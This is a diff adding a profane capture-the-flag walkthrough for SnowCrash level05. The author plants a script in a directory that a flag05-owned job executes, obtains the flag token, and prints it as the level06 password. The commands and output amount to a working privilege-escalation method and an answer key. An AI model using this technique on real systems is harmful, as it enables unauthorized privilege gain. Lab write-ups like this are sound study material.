@@ -338,3 +338,75 @@ Continuing at 0x8048dc4.
 [Inferior 1 (process 2721) exited normally]
 ```
 *level14*
+
+## RE level05, been told you SHOULDN'T REVERSE /bin/getflag, who the fuck comes up with these rules
+Again fucking empty working directory
+```
+level05@SnowCrash:~$ find / -user flag05 2>/dev/null
+```
+*stupid directories and files I dgaf*
+```
+level05@SnowCrash:~$ find / -user flag05 2>/dev/null
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+```
+the first is a file containing a script
+```
+level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
+-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+```
+*no special permissions mo SUID, guess I'll die*
+```
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver 
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+```
+Second is a file as well can't open it
+```
+level05@SnowCrash:~$ ls -l /rofs/usr/sbin/openarenaserver
+-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
+level05@SnowCrash:~$ cat /rofs/usr/sbin/openarenaserver
+cat: /rofs/usr/sbin/openarenaserver: Permission denied
+```
+### the stupid script
+loops on files in **/opt/openarenaserver/**, sets ulimit to 5 and executes them then deletes files
+
+*ulimit -t 5: this shit sets a timer of 5 seconds on allowed time to execute process, if time is 'dépassé', dk what the word is, then process is terminated or killed*
+
+*bash -x: executes .sh files*
+
+After many attempts to create a file a.sh in /opt/openarenaserver/ containing the **getflag**, and executing the script, token still empty, and file is deleted, I guess **because the script is executed with the user's permissions, and not the owner's, nothing special happens, It's the same as executing getflag myself from the terminal**
+
+*However, this challenge can't be this fucking retarded, to give a script with no fucking special permissions how the fuck am I supposed to do anything with it.*
+
+```
+level05@SnowCrash:~$ps -ef
+```
+*attempt to see if a process with higher permissions could execute this in the background, nothing*
+
+#### little experiment
+Created a file inside /opt/openarenaserver/, empty file, and waited to see if it will be deleted
+
+After a while **IT DID**, so recreated file a.sh with getflag inside and redirected the getflag output to  file in /tmp, just to save output before files get deleted
+```
+level05@SnowCrash:~$ touch /opt/openarenaserver/a.sh
+level05@SnowCrash:~$ echo "getflag > /tmp/a" > /opt/openarenaserver/a.sh
+level05@SnowCrash:~$ cd /opt/openarenaserver/
+level05@SnowCrash:/opt/openarenaserver$ ls
+level05@SnowCrash:/opt/openarenaserver$ ls
+level05@SnowCrash:/opt/openarenaserver$ cat /tmp/a
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+```
+*after a while file was delleted, and there's the flaaaaaag*
+```
+level05@SnowCrash:/opt/openarenaserver$ su level06
+Password:viuaaale9huek52boumoomioc
+```
+*I'm still depressed*
+## level06 a.k.a I swear I'm gonna get kicked out
+**UGH PHP**
+Fuck php, wtf, kill me
